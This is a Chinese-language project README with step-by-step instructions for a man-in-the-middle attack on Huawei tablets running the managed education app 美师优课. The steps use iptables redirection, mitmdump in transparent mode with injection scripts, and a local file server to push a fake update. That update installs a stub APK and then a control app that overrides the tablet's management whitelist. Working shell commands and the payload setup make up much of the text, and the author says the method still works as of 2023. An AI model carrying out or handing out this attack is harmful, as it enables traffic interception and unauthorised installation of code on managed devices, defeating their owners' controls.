# msykinject2

两年前，本程序成功利用**非强制加密https**成功实现免设置代理和证书直接进行中间人攻击的实例.到2023年6月17日，此方法**仍然有效**

### 概述

在装有**美师优课**的华为平板上通过修改更新，安装相同包名的lspdemo-stub，启动后向平板发生白名单广播（会被瞬间卸载），写入lspdemo主程序的白名单，再次进行更新替换安装lspdemo-bronya从而控制平板。

### 环境

可以正常上网的linux机器 wifi网卡

**注意**:以下均在su权限下执行



### 步骤：

0.安装python3(如果已经安装可以跳过本步)

```shell
sudo apt-get update
sudo apt-get install python-is-python3
```

1.电脑端设置允许流量转发

注：此步骤执行过就不需要每次执行。

```shell
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1
sysctl -w net.ipv4.conf.all.send_redirects=0
```

2.开启wifi热点 

在`ipconfig`中找到对应的**wifi热点**的网卡 比如说我的是`wlo1`的网卡

在这两行中，把`wlo1`改成自己的wifi热点网卡名

```shell
iptables -t nat -A PREROUTING -i wlo1 -p tcp --dport 80 -j REDIRECT --to-port 8888
iptables -t nat -A PREROUTING -i wlo1 -p tcp --dport 443 -j REDIRECT --to-port 8888
```

----

以下步骤需要掌握一定基础

----

3.在你的应用商店里找到可以卸载的app卸载一个，并且知道它的包名。

在[releases](https://github.com/ljlVink/LinspirerDemo/releases) 找到preloader-stub修改包名，重新打包签名，并且下载`lspdemo_bronya.apk`**一并放到本目录**

3.用一个文件服务器在内网开放。新开个终端运行 fserver_

注:如果不信任此二进制文件_fserver，可以在fserver目录中自行编译 命令:  `CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w"`


```
./_fserver
```

此时你会看到类似内容

```
file server is running at xxx
```

xxx是对应的ip地址

4.修改payloadx.json

复制xxx对应的ip地址打开**payload0.json**找到'addr'项目

```
"addr": "http://xxx/flie/stub.apk",
```

xxx改成自己的ip地址，stub改成你对应的preloader-stub的文件名。相同方法在**payload1.json**同样改成对应lspdemo_bronya的文件名

5.平板连接热点

**6.运行mitmdump(1/2)。**

```shell
./mitmdump --mode transparent -s Install_stub.py -p 8888
```

此时打开msyk,如果没问题的话,控制台会接收到类似`hook success`的字样,并且收到更新。点击下载，**注意安装后立即点打开，必须要闪一下界面退回到桌面!!，不闪界面被卸载都是失效!! 我在这里通常试了10几次左右才行**


```
会出现的问题：

1.不显示更新字样，并且终端无hook success显示：

检查第二步，网卡是不是选错了。

2.终端有hook success显示，但是下载不读条。

检查文件服务器可用性，比如说用浏览器下载以下改到payload.json的链接是否可用。

3.第一步确实没错，但是终端疯狂显示tls handshake failed.

不用下一步了，本项目失效。
```

按下ctrl+c停止程序。

6.运行mitmdump(2/2)。

```shell
./mitmdump --mode transparent -s Install_main.py -p 8888
```

此时打开msyk,如果没问题的话,控制台会接收到类似`hook success`的字样,并且收到更新。点击下载安装启动lspdemo(不会被卸载)，**lspdemo如果安装失败，请重复上一步**


